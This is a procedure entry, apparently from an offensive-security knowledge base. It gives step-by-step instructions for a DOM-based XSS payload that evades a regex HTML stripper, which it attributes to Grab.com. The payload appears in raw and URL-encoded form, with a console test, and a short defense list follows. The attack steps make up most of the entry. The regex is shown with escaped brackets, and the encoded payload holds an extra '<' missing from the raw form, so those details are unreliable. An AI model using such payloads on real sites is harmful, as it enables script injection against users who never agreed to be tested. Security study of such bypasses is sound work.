---
id: proc-uuid-2
tags:
  - xss
  - payload-crafting
  - bypass
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:18.416Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Regex-Bypass-Payload-for-DOM-XSS

## Summary

This procedure crafts a specially encoded HTML payload that evades a flawed regex-based HTML stripper, enabling DOM-based XSS by preserving scriptable elements like img onerror handlers.

## Description

For the Grab.com stripHtml function, the payload uses malformed attributes and URL encoding to trick the regex /<\/?\w+\[^>\]*\/?>/g. The raw payload <a/:<"a">img src=# onerror=confirm('XSSED')> confuses the pattern matching, allowing the img tag to execute JavaScript when innerHTML is set. This is tested locally before injection.

## Requirements

1. Knowledge of URL encoding and HTML malformation techniques
2. Access to a JS console or online encoder for testing
3. Understanding of the target regex pattern

## Defense

Defensive measures and detection strategies:

- Replace regex-based stripping with robust parsers like DOMPurify
- Enforce strict Content Security Policy (CSP) to block inline scripts
- Log and alert on suspicious URL parameters containing encoded HTML

## Objectives

1. Create a payload that survives regex replacement
2. Ensure onerror or similar events remain executable
3. Encode for URL transmission without breaking

## Instructions

### Step 1: Design Malformed HTML Structure

**Context**: Build a tag that doesn't match the regex due to irregular syntax.

Construct <a/:<"a">img src=# onerror=confirm('XSSED')>, where the opening tag uses /: and quoted attributes to evade \w+ and [^>]* matching.

### Step 2: URL-Encode the Payload

**Context**: Prepare for injection into query parameters.

Encode the payload to %3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E using a browser's encodeURIComponent or online tool.

### Step 3: Validate in Local JS Environment

**Context**: Confirm the bypass before live testing.

In browser console, simulate: let div = document.createElement('div'); div.innerHTML = decodeURIComponent('%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E').replace(/<\/?\w+\[^>\]*\/?>/g, ''); console.log(div.textContent); – verify img persists and onerror would fire.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[bypass]]
